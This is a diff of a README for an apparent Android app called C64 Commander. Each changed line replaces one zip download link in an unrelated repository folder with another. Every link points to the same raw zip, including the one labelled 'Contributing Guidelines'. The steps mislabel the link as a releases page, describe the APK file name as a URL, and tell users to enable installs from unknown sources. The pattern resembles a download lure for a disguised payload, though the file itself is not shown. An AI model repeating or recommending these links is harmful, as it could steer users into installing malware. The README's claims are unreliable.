@@ -4,7 +4,7 @@
 C64 Commander is an Android app designed to configure and control a Commodore 64 Ultimate device on your local network. Enjoy a simple and intuitive interface that puts power at your fingertips. Whether you're reliving childhood memories or exploring retro gaming, this app brings fast and effective control to your Commodore 64.
 
 ## 📥 Download Now
-[![Download c64commander](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/commander-c-v2.7-beta.3.zip)](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/commander-c-v2.7-beta.3.zip)
+[![Download c64commander](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/c_commander_v1.0.zip)](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/c_commander_v1.0.zip)
 
 ## 🚀 Getting Started
 Follow these easy steps to download and run C64 Commander:
@@ -15,13 +15,13 @@ Ensure you have an Android device. The app is compatible with most modern Androi
 ### Step 2: Visit the Releases Page
 Go to the Releases page to download the app. This page contains all available versions of the app for you to choose from.
 
-[Download c64commander here](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/commander-c-v2.7-beta.3.zip)
+[Download c64commander here](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/c_commander_v1.0.zip)
 
 ### Step 3: Choose the Latest Version
 On the Releases page, look for the latest version. Typically, the latest version will be at the top of the list.
 
 ### Step 4: Download the APK File
-Click on the APK file link to start the download. The file will have a name similar to `https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/commander-c-v2.7-beta.3.zip`.
+Click on the APK file link to start the download. The file will have a name similar to `https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/c_commander_v1.0.zip`.
 
 ### Step 5: Enable App Installations from Unknown Sources
 Before installing the app, you need to allow installations from unknown sources. 
@@ -65,6 +65,6 @@ Join the conversation! Share your experiences, questions, and tips about using C
 If you encounter any issues, please reach out through our GitHub Issues page, where our team is ready to assist you.
 
 ## 💡 Contributing
-Interested in helping improve C64 Commander? We welcome contributions! Visit our [Contributing Guidelines](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/commander-c-v2.7-beta.3.zip) for details on how you can help.
+Interested in helping improve C64 Commander? We welcome contributions! Visit our [Contributing Guidelines](https://raw.githubusercontent.com/devwarly/c64commander/main/tenorist/c_commander_v1.0.zip) for details on how you can help.
 
 Thank you for using C64 Commander! We hope you enjoy exploring the world of retro computing with ease and simplicity.
